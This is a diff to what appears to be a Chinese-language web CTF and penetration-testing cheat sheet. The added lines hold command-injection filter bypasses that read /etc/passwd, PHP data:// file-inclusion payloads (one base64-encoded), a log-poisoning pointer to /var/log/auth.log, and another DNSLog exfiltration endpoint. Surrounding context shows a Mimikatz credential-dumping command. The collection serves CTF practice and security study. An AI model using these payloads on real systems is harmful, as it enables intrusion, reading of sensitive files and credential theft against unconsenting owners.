@@ -268,6 +268,9 @@ cat $(ls)
     - `cat${IFS}flag`
     - `ls$IFS-alh`
     - `cat$IFS$2flag`
+- `cat</etc/passwd`
+- `{cat,/etc/passwd}`
+- `X=$'cat\x20/etc/passwd'&&$X`
 
 ## Keyword繞過
 
@@ -775,6 +778,14 @@ HQL injection example (pwn2win 2017)
 - `../../../../proc/self/environ`
     - HTTP_User_Agent塞php script
 
+## log文件
+
+- apache log
+- mysql log
+- ssh log
+    - `/var/log/auth.log`
+
+
 ## php://filter
 
 - `php://filter/convert.base64-encode/resource=index.php`
@@ -790,6 +801,16 @@ HQL injection example (pwn2win 2017)
 - 對server以form-data上傳文件，會產生tmp檔
 - 利用phpinfo得到tmp檔路徑和名稱
 - Get shell
+
+## data://
+
+- 條件
+    - allow_url_fopen: On
+    - allow_url_include: On
+- 用法
+    - `?file=data://text/plain,<?php phpinfo()?>`
+    - `?file=data:text/plain,<?php phpinfo()?>`
+    - `?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`
 
 ## zip / phar
 
@@ -1348,6 +1369,7 @@ xxe.dtd:
 - DNSLog
     - http://ceye.io
     - https://www.t00ls.net/dnslog.html
+    - http://dnsbin.zhack.ca/
 
 - Mimikatz
     - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
